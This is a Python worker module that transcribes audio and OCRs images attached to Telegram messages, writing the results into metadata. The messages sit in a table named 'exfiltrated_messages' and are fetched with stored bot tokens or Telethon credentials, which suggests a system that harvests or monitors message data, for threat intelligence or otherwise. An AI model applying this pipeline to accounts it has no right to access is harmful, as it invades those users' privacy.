"""Heavy media-enrichment flow tasks (ASR + OCR).

These tasks run on the dedicated ``heavy`` queue/container because both
faster-whisper and tesseract are memory-hungry.  The module itself MUST stay
import-safe for the lean worker image: heavy third-party packages are imported
inside the task helpers only, so ``app.workers.tasks.flows.heavy`` can be listed
in the main worker's imports without pulling the models (or the packages) in.

Downloading reuses ``BroadcasterService._download_media_bytes`` — source-bot
token first, Telethon fallback — so there is a single downloader in the repo.
Failures are recorded in ``file_meta`` instead of raised: these are enrichment
tasks, and a retry storm on a corrupt/oversized/absent attachment is useless.
"""

import io
import threading

from .common import *

# ── ASR caps / model identity ────────────────────────────────────────────────
MAX_ASR_BYTES = 25 * 1024 * 1024  # Telegram Bot API download ceiling
MAX_ASR_DURATION_SECONDS = 600.0
ASR_MODEL_NAME = "small-int8"
ASR_MEDIA_TYPES = {"voice", "audio", "video_note"}
ASR_RELEVANT_MIME_PREFIXES = ("audio/", "video/")

# ── OCR caps / model identity ────────────────────────────────────────────────
MAX_OCR_BYTES = 10 * 1024 * 1024
OCR_LANGUAGE = "eng+chi_sim+rus"
OCR_MODEL_NAME = "tesseract"
OCR_IMAGE_EXTENSIONS = (".jpg", ".jpeg", ".png", ".webp", ".tif", ".tiff")

# Lazy module-level faster-whisper singleton (never constructed at import time).
_WHISPER_MODEL = None
_WHISPER_MODEL_LOCK = threading.Lock()


def _get_whisper_model():
    """Return the process-wide ``small`` int8 WhisperModel, lazily built."""
    global _WHISPER_MODEL
    if _WHISPER_MODEL is None:
        with _WHISPER_MODEL_LOCK:
            if _WHISPER_MODEL is None:
                from faster_whisper import WhisperModel

                _WHISPER_MODEL = WhisperModel(
                    "small", device="cpu", compute_type="int8"
                )
    return _WHISPER_MODEL


def _declared_size(file_meta: dict) -> int | None:
    """Best-effort size from stored metadata (Bot API or Telethon shape)."""
    for key in ("file_size", "size"):
        value = file_meta.get(key)
        if value is None:
            continue
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return None


def _declared_duration(file_meta: dict) -> float | None:
    for key in ("duration", "media_duration"):
        value = file_meta.get(key)
        if value is None:
            continue
        try:
            return float(value)
        except (TypeError, ValueError):
            continue
    return None


def _has_download_handle(file_meta: dict) -> bool:
    if file_meta.get("file_id"):
        return True
    return bool(file_meta.get("id") and file_meta.get("access_hash"))


def _mime_of(file_meta: dict) -> str:
    return str(file_meta.get("mime") or file_meta.get("mime_type") or "").lower()


async def _load_message_row(message_id: str) -> dict | None:
    response = await async_execute(
        db.table("exfiltrated_messages")
        .select("id, credential_id, media_type, file_meta")
        .eq("id", message_id)
        .limit(1)
    )
    rows = response.data or []
    return rows[0] if rows else None


async def _merge_file_meta(message_id: str, file_meta: dict, updates: dict) -> bool:
    """Merge ``updates`` into ``file_meta`` without clobbering existing keys."""
    merged = dict(file_meta or {})
    merged.update(updates)
    try:
        await async_execute(
            db.table("exfiltrated_messages")
            .update({"file_meta": merged})
            .eq("id", message_id)
        )
        return True
    except Exception as exc:  # noqa: BLE001 - enrichment must not raise
        logger.warning(
            "[Heavy] file_meta update failed for msg=%s: %s", message_id, exc
        )
        return False


async def _skip(message_id: str, file_meta: dict, key: str, reason: str) -> dict:
    await _merge_file_meta(message_id, file_meta, {key: reason})
    logger.info("[Heavy] msg=%s skipped: %s", message_id, reason)
    return {"status": "skipped", "reason": reason}


async def _download(file_meta: dict, credential_id: str | None) -> bytes | None:
    if not _has_download_handle(file_meta):
        return None
    try:
        return await get_broadcaster()._download_media_bytes(
            file_meta, credential_id
        )
    except Exception as exc:  # noqa: BLE001 - download failure is a skip
        logger.warning("[Heavy] media download failed: %s", exc)
        return None


# ==============================================
# ASR
# ==============================================
@app.task(name="heavy.transcribe_media")
def transcribe_media(message_id: str):
    """Transcribe a voice/audio/video-note message into ``file_meta``."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_transcribe_media_logic(message_id))


async def _transcribe_media_logic(message_id: str) -> dict:
    message_id = str(message_id)
    try:
        row = await _load_message_row(message_id)
    except Exception as exc:  # noqa: BLE001
        logger.warning("[HeavyASR] row lookup failed for msg=%s: %s", message_id, exc)
        return {"status": "db_lookup_failed"}

    if row is None:
        return {"status": "not_found"}

    file_meta = dict(row.get("file_meta") or {})
    media_type = str(row.get("media_type") or "").lower()

    # Idempotent re-delivery: never re-run the model over finished rows.
    if isinstance(file_meta.get("transcript_text"), str) and file_meta[
        "transcript_text"
    ].strip():
        return {"status": "already_transcribed"}
    if file_meta.get("transcript_skipped"):
        return {
            "status": "already_skipped",
            "reason": file_meta.get("transcript_skipped"),
        }

    if media_type not in ASR_MEDIA_TYPES:
        return await _skip(
            message_id, file_meta, "transcript_skipped", "unsupported_media_type"
        )

    declared_size = _declared_size(file_meta)
    if declared_size is not None and declared_size > MAX_ASR_BYTES:
        return await _skip(message_id, file_meta, "transcript_skipped", "too_large")

    declared_duration = _declared_duration(file_meta)
    if (
        declared_duration is not None
        and declared_duration > MAX_ASR_DURATION_SECONDS
    ):
        return await _skip(message_id, file_meta, "transcript_skipped", "too_long")

    data = await _download(file_meta, row.get("credential_id"))
    if not data:
        return await _skip(message_id, file_meta, "transcript_skipped", "missing_media")
    if len(data) > MAX_ASR_BYTES:
        return await _skip(message_id, file_meta, "transcript_skipped", "too_large")

    try:
        model = _get_whisper_model()
    except Exception as exc:  # noqa: BLE001 - missing package/model is not fatal
        logger.warning("[HeavyASR] model unavailable: %s", exc)
        return await _skip(
            message_id, file_meta, "transcript_skipped", "asr_unavailable"
        )

    try:
        segments, info = model.transcribe(io.BytesIO(data), vad_filter=True)
        transcript = " ".join(
            segment.text.strip()
            for segment in segments
            if getattr(segment, "text", None) and segment.text.strip()
        ).strip()
        duration = float(getattr(info, "duration", 0.0) or 0.0)
        language = getattr(info, "language", None) or "unknown"
    except Exception as exc:  # noqa: BLE001 - corrupt/unsupported audio
        logger.warning("[HeavyASR] transcription failed for msg=%s: %s", message_id, exc)
        return await _skip(
            message_id, file_meta, "transcript_skipped", "transcription_failed"
        )

    if duration > MAX_ASR_DURATION_SECONDS:
        return await _skip(message_id, file_meta, "transcript_skipped", "too_long")

    updated = await _merge_file_meta(
        message_id,
        file_meta,
        {
            "transcript_text": transcript,
            "transcript_language": language,
            "transcript_model": ASR_MODEL_NAME,
            "transcript_duration": round(duration, 3),
        },
    )
    if not updated:
        return {"status": "update_failed"}

    # Character count only — transcript content must never reach the logs.
    logger.info(
        "[HeavyASR] transcribed msg=%s chars=%s duration=%.1fs lang=%s",
        message_id,
        len(transcript),
        duration,
        language,
    )
    return {
        "status": "ok",
        "chars": len(transcript),
        "duration": round(duration, 3),
        "language": language,
    }


# ==============================================
# OCR
# ==============================================
def _is_image_media(media_type: str, file_meta: dict) -> bool:
    if media_type == "photo":
        return True
    if media_type != "document":
        return False
    if _mime_of(file_meta).startswith("image/"):
        return True
    file_name = str(file_meta.get("file_name") or "").lower()
    return file_name.endswith(OCR_IMAGE_EXTENSIONS)


@app.task(name="heavy.ocr_media")
def ocr_media(message_id: str):
    """OCR a photo/document image into ``file_meta``."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_ocr_media_logic(message_id))


async def _ocr_media_logic(message_id: str) -> dict:
    message_id = str(message_id)
    try:
        row = await _load_message_row(message_id)
    except Exception as exc:  # noqa: BLE001
        logger.warning("[HeavyOCR] row lookup failed for msg=%s: %s", message_id, exc)
        return {"status": "db_lookup_failed"}

    if row is None:
        return {"status": "not_found"}

    file_meta = dict(row.get("file_meta") or {})
    media_type = str(row.get("media_type") or "").lower()

    if isinstance(file_meta.get("ocr_text"), str) and file_meta["ocr_text"].strip():
        return {"status": "already_ocred"}
    if file_meta.get("ocr_skipped"):
        return {
            "status": "already_skipped",
            "reason": file_meta.get("ocr_skipped"),
        }

    if media_type not in {"photo", "document"}:
        return await _skip(
            message_id, file_meta, "ocr_skipped", "unsupported_media_type"
        )
    if not _is_image_media(media_type, file_meta):
        return await _skip(message_id, file_meta, "ocr_skipped", "non_image")

    declared_size = _declared_size(file_meta)
    if declared_size is not None and declared_size > MAX_OCR_BYTES:
        return await _skip(message_id, file_meta, "ocr_skipped", "too_large")

    data = await _download(file_meta, row.get("credential_id"))
    if not data:
        return await _skip(message_id, file_meta, "ocr_skipped", "missing_media")
    if len(data) > MAX_OCR_BYTES:
        return await _skip(message_id, file_meta, "ocr_skipped", "too_large")

    try:
        import pytesseract
        from PIL import Image
    except Exception as exc:  # noqa: BLE001 - lean image has no tesseract/Pillow
        logger.warning("[HeavyOCR] OCR engine unavailable: %s", exc)
        return await _skip(message_id, file_meta, "ocr_skipped", "ocr_unavailable")

    try:
        with Image.open(io.BytesIO(data)) as img:
            img.load()
            image = img.convert("RGB")
    except Exception as exc:  # noqa: BLE001 - corrupt/truncated image
        logger.warning("[HeavyOCR] corrupt image for msg=%s: %s", message_id, exc)
        return await _skip(message_id, file_meta, "ocr_skipped", "corrupt_image")

    try:
        text = (pytesseract.image_to_string(image, lang=OCR_LANGUAGE) or "").strip()
    except Exception as exc:  # noqa: BLE001 - tesseract runtime failure
        logger.warning("[HeavyOCR] tesseract failed for msg=%s: %s", message_id, exc)
        return await _skip(message_id, file_meta, "ocr_skipped", "ocr_failed")

    updated = await _merge_file_meta(
        message_id,
        file_meta,
        {
            "ocr_text": text,
            "ocr_language": OCR_LANGUAGE,
            "ocr_model": OCR_MODEL_NAME,
        },
    )
    if not updated:
        return {"status": "update_failed"}

    # Character count only — OCR text must never reach the logs.
    logger.info(
        "[HeavyOCR] ocred msg=%s chars=%s lang=%s",
        message_id,
        len(text),
        OCR_LANGUAGE,
    )
    return {"status": "ok", "chars": len(text)}
